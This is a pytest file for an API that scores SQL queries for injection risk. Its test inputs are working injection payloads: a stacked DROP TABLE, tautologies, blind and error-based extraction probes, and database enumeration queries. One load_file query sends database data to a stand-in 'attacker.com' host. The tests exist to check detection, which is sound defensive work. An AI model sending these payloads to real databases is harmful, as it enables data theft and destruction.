from __future__ import annotations


def _admin_token(client) -> str:
    login = client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": "admin-password-123"},
    )
    assert login.status_code == 200, login.text
    return login.json()["access_token"]


def test_sql_query_response_includes_precision_v2_fields(client):
    token = _admin_token(client)
    response = client.post(
        "/api/v1/analyze-sql/query",
        headers={"Authorization": f"Bearer {token}"},
        json={"query": "SELECT * FROM users; DROP TABLE users; --"},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    combined = body.get("combined_assessment") or {}

    assert "calibrated_risk_score" in combined
    assert isinstance(combined.get("calibrated_risk_score"), (float, int))
    assert 0.0 <= float(combined["calibrated_risk_score"]) <= 1.0
    assert "signal_contributions" in combined and isinstance(combined["signal_contributions"], dict)
    assert "ast_features" in combined and isinstance(combined["ast_features"], dict)
    assert combined["ast_features"].get("statement_count", 0) >= 1
    assert combined.get("overall_risk_level") in {"Low", "Medium", "High", "Critical"}


def test_sql_precision_eval_endpoint_returns_metrics(client):
    token = _admin_token(client)
    payload = {
        "samples": [
            {"query": "SELECT id, email FROM users WHERE id = 42", "expected_label": "benign"},
            {"query": "SELECT * FROM users WHERE id = 1 OR 1=1 --", "expected_label": "malicious"},
            {"query": "SELECT * FROM users; DROP TABLE users; --", "expected_label": "malicious"},
            {"query": "SELECT COUNT(*) FROM orders WHERE user_id = 7", "expected_label": "benign"},
        ],
        "include_predictions": True,
        "max_examples": 10,
    }
    response = client.post(
        "/api/v1/analyze-sql/precision-eval",
        headers={"Authorization": f"Bearer {token}"},
        json=payload,
    )
    assert response.status_code == 200, response.text
    body = response.json()

    assert body["sample_count"] == 4
    assert "confusion_matrix" in body
    for k in ("tp", "fp", "tn", "fn"):
        assert k in body["confusion_matrix"]
        assert isinstance(body["confusion_matrix"][k], int)

    for metric in ("precision", "recall", "f1", "accuracy"):
        assert metric in body
        assert isinstance(body[metric], (float, int))
        assert 0.0 <= float(body[metric]) <= 1.0

    assert "thresholds" in body and isinstance(body["thresholds"], dict)
    assert "predictions" in body and isinstance(body["predictions"], list)


def test_sql_analysis_flags_blind_subquery_exfiltration_payload(client):
    token = _admin_token(client)
    payload = "SELECT * FROM invoices WHERE invoice_id = 10 AND SUBSTRING((SELECT version()),1,1)='1' --;"
    response = client.post(
        "/api/v1/analyze-sql/query",
        headers={"Authorization": f"Bearer {token}"},
        json={"query": payload},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    combined = body.get("combined_assessment") or {}
    heur = body.get("heuristics_detection") or {}
    hits = list((heur.get("hits") or []))

    assert "blind_subquery_exfiltration" in hits
    assert combined.get("overall_risk_level") in {"High", "Critical"}
    assert str(combined.get("suggested_action") or "").upper() in {"FLAG_FOR_REVIEW_BLOCK", "BLOCK_IMMEDIATE"}


def test_sql_analysis_detects_error_based_and_exists_probes(client):
    token = _admin_token(client)
    samples = [
        (
            "SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, @@version));",
            "error_extractvalue_probe",
        ),
        (
            "SELECT * FROM users WHERE id = 1 AND UPDATEXML(1, CONCAT(0x7e, database()), 1);",
            "error_updatexml_probe",
        ),
        (
            "SELECT * FROM users WHERE id = 1 OR EXISTS(SELECT 1 FROM admins WHERE username='root');",
            "or_exists_subquery",
        ),
    ]

    for query, expected_hit in samples:
        response = client.post(
            "/api/v1/analyze-sql/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": query},
        )
        assert response.status_code == 200, response.text
        body = response.json()
        hits = list(((body.get("heuristics_detection") or {}).get("hits") or []))
        combined = body.get("combined_assessment") or {}

        assert expected_hit in hits
        assert combined.get("overall_risk_level") in {"High", "Critical"}
        assert str(combined.get("suggested_action") or "").upper() in {"FLAG_FOR_REVIEW_BLOCK", "BLOCK_IMMEDIATE"}


def test_sql_analysis_closes_recon_and_privileged_ddl_gaps(client):
    token = _admin_token(client)
    samples = [
        ("SELECT banner FROM v$version;", {"oracle_v_version"}),
        ("SELECT schema_name FROM information_schema.schemata;", {"information_schema"}),
        ("SELECT name FROM master.dbo.sysdatabases;", {"mssql_sysdatabases_enum"}),
        ("SELECT load_file(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\data.txt'));", {"file_ops"}),
        ("CREATE USER test1 IDENTIFIED BY 'pass1';", {"privileged_account_ddl"}),
    ]

    for query, expected_hits in samples:
        response = client.post(
            "/api/v1/analyze-sql/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": query},
        )
        assert response.status_code == 200, response.text
        body = response.json()
        combined = body.get("combined_assessment") or {}
        hits = set(((body.get("heuristics_detection") or {}).get("hits") or []))
        action = str(combined.get("suggested_action") or "").upper()

        assert expected_hits.issubset(hits), (query, hits)
        assert combined.get("overall_risk_level") in {"Medium", "High", "Critical"}
        assert action in {"FLAG_FOR_REVIEW", "FLAG_FOR_REVIEW_BLOCK", "BLOCK_IMMEDIATE"}
